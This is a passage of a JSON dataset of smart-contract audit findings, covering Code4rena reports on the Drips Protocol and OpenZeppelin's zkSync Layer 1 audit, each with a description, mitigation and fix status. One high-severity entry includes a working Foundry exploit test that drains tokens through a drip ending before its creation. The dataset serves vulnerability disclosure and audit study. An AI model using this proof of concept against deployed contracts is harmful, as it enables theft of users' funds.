commented](https://github.com/code-423n4/2023-01-drips-findings/issues/163#issuecomment-1441675954):**\n > > The approval should be considered an extremely dangerous operation, which can cause drastic losses, however, a malicious approval can eventually be unapproved via a macro contract\n> \n> Yes, we agree here. We envision it more like the same actor/organization is using multiple \n> addresses. \n> \n> Like the multi-sig of an organization is used as the main address (address with the ens name) but not all actions might require multiple signatures. Therefore, they can approve another address. etc.\n> \n> However, we assume full trust. \n> \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/163#issuecomment-1445444330):**\n>Confirming Medium severity because:\n>- The risk is not in giving the approval, that is the feature offered\n>- The risk is in not being able to revoke an approval, due to a lack of `revokeAll` or similar functionality, which can create a temporary grief\n>\n>Because that can cause a denial of functionality which is limited in time, I believe Medium Severity to be the most appropriate.\n>\n***\n\n",
      "summary": "\nA bug has been identified in the Caller contract which enables users to authorize other users to execute transactions on their behalf. This bug allows a malicious user to gain back their authority after it has been revoked by the original user. This is done by the malicious user front-running the transaction to unauthorize them and adding another user who can then re-authorize them. This could lead to a loss of funds for the original user as the malicious user can keep executing transactions on their behalf.\n\nThe bug can be demonstrated by a proof of concept. Alice authorizes Bob, but Bob becomes malicious and Alice wants to remove him. Bob notices the transaction to unauthorize him and front runs it by authorizing Eve. Alice's unauthorize transaction is then executed, and Bob can now authorize himself back again via Eve's account.\n\nFront running can be done by either sending a transaction with a higher gas price or by paying additional fees to the validator. This could lead to an ongoing battle between Alice and Bob that could last forever, and Alice might not have the resources or time to keep up with it.\n\nThe recommended mitigation step for this bug is to not allow authorized users to call the `authorize()` method on behalf of the original user. This can be done by replacing `_msgSender()` with `msg.sender` at `authorize()`. Alternatively, if the developers want to enable authorizing by signing, they should add a dedicated function for that.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "https://github.com/code-423n4/2023-01-drips-findings/issues/163",
      "tags": [],
      "finders": [
        "0xA5DF",
        "0xbepresent  ladboy233"
      ]
    },
    {
      "id": "6576",
      "title": "[M-01] Squeezing drips from a sender can be front-run and prevented by the sender",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L411> \n\n<https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L461>\n\nSqueezing drips from a sender requires providing the sequence of drips configurations (see NatSpec description in [L337-L338](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L337-L338)):\n\n> /// It can start at an arbitrary past configuration, but must describe all the configurations\n> /// which have been used since then including the current one, in the chronological order.\n\nThe provided history entries are hashed and verified against the sender's `dripsHistoryHash`.\n\nHowever, the sender can prevent a receiver from squeezing drips by front-running the squeeze transaction and adding a new configuration. Adding a new configuration updates the current `dripsHistoryHash` and invalidates the `historyHash` provided by the receiver when squeezing. The receiver will then fail the drips history verification in [L461](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L461) and the squeeze will fail.\n\n### Impact\n\nA sender can prevent its drip receivers from squeezing by front-running the squeeze transaction and adding a new configuration.\n\n### Proof of Concept\n\n[Drips.sol#L411](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L411)\n\n```solidity\n392: function _squeezeDripsResult(\n393:     uint256 userId,\n394:     uint256 assetId,\n395:     uint256 senderId,\n396:     bytes32 historyHash,\n397:     DripsHistory[] memory dripsHistory\n398: )\n399:     internal\n400:     view\n401:     returns (\n402:         uint128 amt,\n403:         uint256 squeezedNum,\n404:         uint256[] memory squeezedRevIdxs,\n405:         bytes32[] memory historyHashes,\n406:         uint256 currCycleConfigs\n407:     )\n408: {\n409:     {\n410:         DripsState storage sender = _dripsStorage().states[assetId][senderId];\n411:         historyHashes = _verifyDripsHistory(historyHash, dripsHistory, sender.dripsHistoryHash);\n412:         // If the last update was not in the current cycle,\n413:         // there's only the single latest history entry to squeeze in the current cycle.\n414:         currCycleConfigs = 1;\n415:         // slither-disable-next-line timestamp\n416:         if (sender.updateTime >= _currCycleStart()) currCycleConfigs = sender.currCycleConfigs;\n417:     }\n...      // [...]\n```\n\n[Drips.sol#L461](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L461)\n\n```solidity\n444: function _verifyDripsHistory(\n445:     bytes32 historyHash,\n446:     DripsHistory[] memory dripsHistory,\n447:     bytes32 finalHistoryHash\n448: ) private pure returns (bytes32[] memory historyHashes) {\n449:     historyHashes = new bytes32[](dripsHistory.length);\n450:     for (uint256 i = 0; i < dripsHistory.length; i++) {\n451:         DripsHistory memory drips = dripsHistory[i];\n452:         bytes32 dripsHash = drips.dripsHash;\n453:         if (drips.receivers.length != 0) {\n454:             require(dripsHash == 0, \"Drips history entry with hash and receivers\");\n455:             dripsHash = _hashDrips(drips.receivers);\n456:         }\n457:         historyHashes[i] = historyHash;\n458:         historyHash = _hashDripsHistory(historyHash, dripsHash, drips.updateTime, drips.maxEnd);\n459:     }\n460:     // slither-disable-next-line incorrect-equality,timestamp\n461:     require(historyHash == finalHistoryHash, \"Invalid drips history\");\n462: }\n```\n\n### Recommended Mitigation Steps\n\nConsider allowing a receiver to squeeze drips from a sender up until the current timestamp.\n\n**[xmxanuel (Drips) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/276#issuecomment-1425726115):**\n > Technically the described attack would work.\n> \n> It is also related to the trust assumption between the sender an receiver. Which are anyway given in a certain form. \n> \n> I am unsure about the proposed solutions.  Currently, we only store the latest dripsHistory hash on-chain. For allowing to squeeze until a specific timestamp, it might be necessary to have the full list of historic hashes on-chain.\n> \n\n**[CodeSandwich (Drips) disagreed with severity and commented](https://github.com/code-423n4/2023-01-drips-findings/issues/276#issuecomment-1427007648):**\n> This attack is in fact possible, but it only allows postponing collecting funds until the end of the cycle. The proposed solution would probably require a lot of storage, so it's probably not worth introducing.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/276#issuecomment-1450276738):**\n > In order to judge this issue I spoke with 4 other judges as well as the Sponsor.\n> \n> This is a difficult decision because of the unclear expectations as to whether the sender is bening towards the receiver or not.\n> \n> Because of the uncertainty, and the possibility of performing the grief, the finding is valid.\n> \n> The issue is in terms of determining it's severity.\n> \n> **The attacker doesn't gain anything**\n> \n> One of the most interesting arguments is the idea that \"the attacker doesn't gain anything\", which can be falsified in scenarios in which squeezing would have helped reach a threshold of tokens in circulation, out of vesting or for similar purposes.\n> \n> If we try hard enough, through multiple people's effort, we can come up with a scenario in which squeezing could make a difference between having enough votes for a Governance Operation, or could offer enough collateral to avoid a liquidation or some level of risk.\n> \n> Those scenarios, while unlikely, can help discredit the idea that \"the attacker doesn't gain anything\".\n> \n> **The grief is limited**\n> \n> On the other hand, we must acknowledge that the attack / griefing, is limited:\n> - The `sender` is the only privileged account that can perform the grief\n> - Squeezing is denied until the next cycle, which based on configuration, will be known, and will be between 1 week and 1 month.\n> \n> These can be viewed as additional external requirements, which reduce the impact / likelihood of the finding\n> \n> **The Squeeze is Squoze**\n> \n> In spite of the external requirements, the finding is showing how the functionality of Squeezing can be denied by the sender.\n> \n> I believe that if anybody could grief squeezing, we would not hesitate in awarding Medium Severity and perhaps we'd be discussing around Med / High.\n> \n> However, in this case, the only account that can perform the grief is the sender.\n> \n> At the same time, the goal of the system is to allow Squeezing, which per the discussion above, given the finding can be prevented until a drip has moved to a newer crycle.\n> \n> **Last Minute Coding**\n> \n> I went into the tests and wrote the following illustratory cases\n> \n> ```solidity\n> function testSenderCanStopAfter() public {\n>         uint128 amt = cycleSecs;\n>         setDrips(sender, 0, amt, recv(receiver, 1), cycleSecs);\n>         DripsHistory[] memory history = hist(sender);\n>         skip(1);\n>         squeezeDrips(receiver, sender, history, 1);\n>         setDrips(sender, amt - 1, 0, recv(receiver, 1), 0);\n> \n>         // Squeeze again\n>         DripsHistory[] memory history2 = hist(history, sender);\n>         squeezeDrips(receiver, sender, history2, 0);\n>         \n>         skipToCycleEnd();\n>         receiveDrips(receiver, 0);\n>     }\n> \n>     function testSenderCannotChangeTheirMind() public {\n>         uint128 amt = cycleSecs;\n>         setDrips(sender, 0, amt, recv(receiver, 1), cycleSecs);\n>         DripsHistory[] memory history = hist(sender);\n>         skip(1);\n>         setDrips(sender, amt - 1, 0, recv(receiver, 1), 0);\n> \n>         // Squeeze First time\n>         DripsHistory[] memory history2 = hist(history, sender);\n>         squeezeDrips(receiver, sender, history2, 1);\n>         \n>         skipToCycleEnd();\n>         receiveDrips(receiver, 0);\n>     }\n> ```\n> \n> Ultimately we can see that what is owed to the recipient can never be taken back, however the sender can, through the grief shown in the above finding, prevent the tokens from being received until the end.\n> \n> **Conclusion**\n> \n> Given the information above, being mindful of:\n> - A potentially severe risk, with very low likelyhood\n> - The temporary breaking of the functionality of squeezing, which was meant to allow by-the-second claims.\n> \n> I agree with Medium Severity.\n> \n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the Drips.sol code related to squeezing drips from a sender. The vulnerability is that a sender can prevent a receiver from squeezing drips by front-running the squeeze transaction and adding a new configuration. This would update the current dripsHistoryHash and invalidate the historyHash provided by the receiver when squeezing, causing the squeeze to fail.\n\nThe vulnerable code is located at Drips.sol#L411 and Drips.sol#L461. At L411, the code checks if the last update was in the current cycle and sets the currCycleConfigs accordingly. At L461 the code checks if the historyHash provided by the receiver matches the finalHistoryHash, and if not, the squeeze fails.\n\nThe impact of this vulnerability is that a sender can prevent its drip receivers from squeezing.\n\nThe recommended mitigation steps are to consider allowing a receiver to squeeze drips from a sender up until the current timestamp.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "https://github.com/code-423n4/2023-01-drips-findings/issues/276",
      "tags": [],
      "finders": [
        "berndartmueller"
      ]
    },
    {
      "id": "6575",
      "title": "[H-01] Drips that end after the current cycle but before its creation can allow users to profit from squeezing",
      "impact": "HIGH",
      "content": "\nBy creating a drip that ends after the current cycle but before its creation time and immediately removing it, the sender doesn't have to put in any assets but the receiver can still squeeze this drip.\n\nBy setting a receiver that the sender controls, the sender can drain an arbitrary asset from the contract.\n\n### Proof of Concept\n\nLet the cycle length be 10 seconds. By i-th second I mean the i-th second of the cycle.\n\nAt the 5th second, sender creates a drip that starts at 0th second and lasts for 2 seconds.\n\nAt the 6th second, sender removes this drip.\n\n<https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L569>\n\nSince the drip ends before it was created, the dripped amount is 0, so the sender can retrieve their full balance.\n\n<https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L425-L430> \n\n<https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L490-L496>\n\nNow the receiver squeezes from this drip. \n\n`SqueezeStartCap = \\_currCycleStart() = 0th second, squeezeEndCap = 6th second`, so the receiver can still squeeze out the full amount even though the sender has withdrawn all of his balance.\n\nPlease add the following test to DripsHub.t.sol. It verifies that the sender has retrieved all of his assets but the receiver can still squeeze.\n\n        function customSetDrips(\n            uint256 forUser,\n            uint128 balanceFrom,\n            uint128 balanceTo,\n            DripsReceiver[] memory newReceivers\n        ) internal {\n            int128 balanceDelta = int128(balanceTo) - int128(balanceFrom);\n            DripsReceiver[] memory currReceivers = loadDrips(forUser);\n\n            vm.prank(driver);\n            int128 realBalanceDelta =\n                dripsHub.setDrips(forUser, erc20, currReceivers, balanceDelta, newReceivers, 0, 0);\n            \n            storeDrips(forUser, newReceivers);\n\n        }\n\n        function testExploitSqueeze() public {\n            skipToCycleEnd();\n            // Start dripping\n            DripsReceiver[] memory receivers = new DripsReceiver[](1);\n            receivers[0] = DripsReceiver(\n                receiver,\n                DripsConfigImpl.create(0, uint160(1 * dripsHub.AMT_PER_SEC_MULTIPLIER()), uint32(block.timestamp), 2)\n            );\n\n            DripsHistory[] memory history = new DripsHistory[](2);\n\n            uint256 balanceBefore = balance();\n            skip(5);\n            customSetDrips(user, 0, 2, receivers);\n            (,, uint32 lastUpdate,, uint32 maxEnd) = dripsHub.dripsState(user, erc20);\n            history[0] = DripsHistory(0, receivers, lastUpdate, maxEnd);\n\n            skip(1);\n            receivers = dripsReceivers();\n            customSetDrips(user, 2, 0, receivers);\n            (,, lastUpdate,, maxEnd) = dripsHub.dripsState(user, erc20);\n            history[1] = DripsHistory(0, receivers, lastUpdate, maxEnd);\n\n            assertBalance(balanceBefore);\n            \n            // Squeeze\n            vm.prank(driver);\n            uint128 amt = dripsHub.squeezeDrips(receiver, erc20, user, 0, history);\n            assertEq(amt, 2, \"Invalid squeezed amt\");\n        }\n\n### Tools Used\n\nVS Code, Foundry\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L426>\n\nOne potential solution is to add an additional check after this line. Something along the lines of:\n\n`if (squeezeStartCap < drips.updateTime) squeezeStartCap = drips.updateTime;`\n\n**[CodeSandwich (Drips) confirmed and commented](https://github.com/code-423n4/2023-01-drips-findings/issues/315#issuecomment-1426376190):**\n> Great job! This is a critical protocol breaker.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/315#issuecomment-1439673302):**\n > The Warden has shown a way to trick the contract into disbursing out funds without the upfront payment.\n> \n> Because this shows a way to steal the principal, I agree with High Severity.\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the Drips smart contract. It states that by creating a drip that ends after the current cycle but before its creation time and immediately removing it, the sender can avoid putting in any assets, but the receiver can still squeeze this drip. It provides a proof of concept to demonstrate the vulnerability, and recommends a mitigation step to fix it. \n\nThe vulnerability affects the Drips smart contract, and the impact is that the sender can drain arbitrary asset from the contract. This is done by setting a receiver that the sender controls. The proof of concept involves setting a cycle length of 10 seconds, and at the 5th second, the sender creates a drip that starts at 0th second and lasts for 2 seconds. At the 6th second, the sender removes this drip. Since the drip ends before it was created, the dripped amount is 0, so the sender can retrieve their full balance. The receiver can still squeeze out the full amount even though the sender has withdrawn all of their balance. \n\nThe tools used to identify the vulnerability were VSCode and Foundry. The suggested mitigation step is to add an additional check after a certain line in the Drips smart contract. This check would ensure that the squeezeStartCap is greater than the drips.updateTime. Additionally, a test was provided to verify that the sender has retrieved all of their assets, but the receiver can still squeeze.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "https://github.com/code-423n4/2023-01-drips-findings/issues/315",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "evan"
      ]
    },
    {
      "id": "10481",
      "title": "Unverified inputs during block commitment",
      "impact": "LOW",
      "content": "In the [`ExecutorFacet` contract](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol) the [`_commitOneBlock` function](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L19) takes the `_newBlock` parameter to validate, extract, and transform block information into a `StoredBlockInfo` struct, which is hashed and stored on chain as a commitment. With a valid zero-knowledge proof this data can later be verified and executed.\n\n\nHowever, several fields of the `_newBlock` input parameter are not validated. This could lead to successful commitments of blocks that eventually will not be executable.\n\n\nConsider preventing the commitment of unexecutable blocks by:\n\n\n* Validating the field `numberOfLayer1Txs` against the number of `L2Log`s with sender `L2_BOOTLOADER_ADDRESS`.\n* Validating the field `l2LogsTreeRoot` against a reconstruction of the Merkle tree from the `l2Logs` array.\n* Validating the field `timestamp` against the local variable `blockTimestamp`.\n\n\n**Update:** *Fixed in commit [`230f400`](https://github.com/matter-labs/zksync-2-dev/commit/230f4007225bc013f9cc15f853af55d4d3588f2b). The Matter Labs team states:*\n\n\n\n> We have applied the recommendations #1 and #3. The recommendation #2 is redundant as it is already covered by zero knowledge proofs. Verifying this on Layer 1 would be too expensive so by design this is entrusted to zero knowledge cryptography.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10480",
      "title": "Unused L2Messages can be committed to L1",
      "impact": "LOW",
      "content": "In the [`ExecutorFacet` contract](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol) the validator provides multiple blocks of type [`CommitBlockInfo`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol#L38) to the [`commitBlocks`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L130) function, which are validated in several steps including [`_processL2Logs`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L75). In this function, the preimages contained in the `_newBlock.l2ArbitraryLengthMessages` array are checked against the hashes contained in `L2Logs` with sender `L2_TO_L1_MESSENGER`.\n\n\nHowever, the counter [`currentMessage`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L109) is incremented only based on the `L2Log` information, without taking the length of the `_newBlock.l2ArbitraryLengthMessages` into account. In effect, the `_newBlock.l2ArbitraryLengthMessages` array can be longer than the number of relevant `L2Log`s contained in the `_newBlock.l2Logs` parameter which might be confusing to the validator and to off-chain receivers of the respective call data.\n\n\nConsider the addition of a final check of `currentMessage` against the length of the `_newBlock.l2ArbitraryLengthMessages` array at the end of the `_processL2Logs` function to ensure that only relevant preimages have been included in the calldata.\n\n\n**Update:** *Fixed in commit [`25913e7`](https://github.com/matter-labs/zksync-2-dev/commit/25913e75ed28dfcd99f36dc9f8bc1d158085f5b0).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10479",
      "title": "Unused input to commit blocks",
      "impact": "LOW",
      "content": "In the `ExecutorFacet` contract, the [`_commitOneBlock` function](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L19) does not make use of the input `_newBlock.priorityOperationsHash`. Instead, [a local variable `priorityOperationsHash` is calculated from the `_newBlock.l2Logs`](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L28) and included in the block commitment.\n\n\nConsider validating both values against each other.\n\n\n**Update:** *Fixed in commit [`615b6a5`](https://github.com/matter-labs/zksync-2-dev/commit/615b6a5c86508e6547dd5f6b03b8a7a79ca31137).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10478",
      "title": "Confusing event emission when executing diamond cut proposals",
      "impact": "LOW",
      "content": "In the [`DiamondCutFacet` contract](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol), the [`executeDiamondCutProposal`](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol#L42) function is used to execute a previously proposed upgrade.\n\n\nThis function [resets the scheduled diamond cut proposal](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol#L61), thereby re-purposing the [`_resetProposal`](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol#L114) function. When this function is successfully executed it triggers a `DiamondCutProposalCancelation` event. Afterwards, `DiamondCutProposalExecution` event is triggered by `executeDiamondCutProposal` function.\n\n\nThis dual event emission of cancellation followed by execution could lead to confusion in off-chain systems.\n\n\nTo prevent emitting a cancellation event during the execution of a diamond cut proposal, consider moving the emission of the `DiamondCutProposalCancelation` event from the [`_resetProposal`](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol#L114) function to the [`cancelDiamondCutProposal`](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol#L35) function.\n\n\n**Update:** *Fixed in commit [`fad57c5`](https://github.com/matter-labs/zksync-2-dev/commit/fad57c5ee21e0a848d856c6a3547a746cfaf87cf).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10477",
      "title": "Require statements with multiple conditions",
      "impact": "LOW",
      "content": "Throughout the [codebase](https://github.com/matter-labs/zksync-2-dev/tree/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/) there are `require` statements that require multiple conditions to be satisfied. For instance:\n\n\n* The `require` statement on [line 37](https://github.com/matter-labs/zksync-2-dev/tree/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L37) of [`Executor.sol`](https://github.com/matter-labs/zksync-2-dev/tree/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol)\n* The `require` statement on [line 251](https://github.com/matter-labs/zksync-2-dev/tree/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L251) of [`Diamond.sol`](https://github.com/matter-labs/zksync-2-dev/tree/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol)\n* The `require` statement on [line 17](https://github.com/matter-labs/zksync-2-dev/tree/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Merkle.sol#L17) of [`Merkle.sol`](https://github.com/matter-labs/zksync-2-dev/tree/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Merkle.sol)\n\n\nTo simplify the codebase and to raise the most helpful error messages for failing `require` statements, consider having a single require statement per condition.\n\n\n**Update:** *Fixed in commit [`b87267c`](https://github.com/matter-labs/zksync-2-dev/commit/b87267cbb0bbeccb7899d8f29b61b777d295f255).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10476",
      "title": "Preimage hash collision protection for storage pointers",
      "impact": "LOW",
      "content": "The Diamond Proxy makes use of the diamond storage pattern to track the facets and selectors in use. This is achieved through a [`DiamondStorage` struct](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L32) that contains the relevant facet and selector information. Because of the proxy setup, this struct is placed in an unstructured-storage-manner at a pseudo random storage slot calculated by [hashing a hardcoded string](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L12).\n\n\nIn the event of introducing a dynamic slot calculation using hashing, the `DiamondStorage` storage slot could be specifically addressed to force a collision using the known input bytes from above.\n\n\nTo prevent this pre-image hash collision, consider applying a `-1` offset to the hash.\n\n\n**Update:** *Fixed in commit [`60b74e0`](https://github.com/matter-labs/zksync-2-dev/commit/60b74e054f9a885bca7a3fd94fbf8376b9a6816b).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10475",
      "title": "Lack of l2Logs validation",
      "impact": "LOW",
      "content": "In the [`ExecutorFacet` contract](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol) within the `commitBlocks` function, the array `_newBlock.l2Logs` is processed in the helper function [`_processL2Logs`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L75). While any L2 user can be the sender of `l2Logs`, three special senders can determine information influencing the hash commitment of the block. Most notably, the sender `L2_SYSTEM_CONTEXT_ADDRESS` can set the `previousBlockHash` and `blockTimestamp` information. Moreover, multiple `L2Logs` of this sender within one block would override each other.\n\n\nWhile the system implicitly assumes that exactly one `L2Log` of sender `L2_SYSTEM_CONTEXT_ADDRESS` is present in each block, this assumption is not enforced during block commitment.\n\n\nConsider enforcing that only one `L2Log` with sender `L2_SYSTEM_CONTEXT_ADDRESS` is present in each block.\n\n\n**Update:** *Fixed in commit [`dfc6fe1`](https://github.com/matter-labs/zksync-2-dev/commit/dfc6fe1e700dbad7776844f224e153a2bdbe455b).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10474",
      "title": "Lack of event information",
      "impact": "LOW",
      "content": "Throughout the [codebase](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts) we found the following occurrences of state changes without event emission and event emissions with insufficient or incorrect information:\n\n\n* In the [`ExecutorFacet` contract](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#)\n\t+ the [`proveBlocks` function](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L194) does not emit an event after altering the storage variable `s.totalBlocksVerified`. Consider creating a new event that can emit both the old and new value of this variable.\n\t+ the [`BlocksRevert` event](https://github.com/matter-labs/zksync-2-dev/tree/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol#L79) is used as `BlocksRevert(s.totalBlocksExecuted, s.totalBlocksCommitted)` which differs from its definition `BlocksRevert(uint256 totalBlocksVerified, uint256 totalBlocksCommitted)` within the [`IExecutor` interface](https://github.com/matter-labs/zksync-2-dev/tree/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol). Consider replacing `s.totalBlocksExecuted` with `s.totalBlocksVerified`.\n* In the [`IExecutor` interface](https://github.com/matter-labs/zksync-2-dev/tree/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol)\n\t+ the [`BlockCommit` event](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol#L73) only contains the `blockNumber`, which might not be unique due to block reversion. Consider adding indexed fields for `blockHash` and `commitment`.\n\t+ the [`BlockExecution` event](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol#L76) only contains the `blockNumber`. Consider adding indexed fields for `blockHash` and `commitment`.\n* In the [`IGovernance` interface](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IGovernance.sol) the [`NewGovernor` 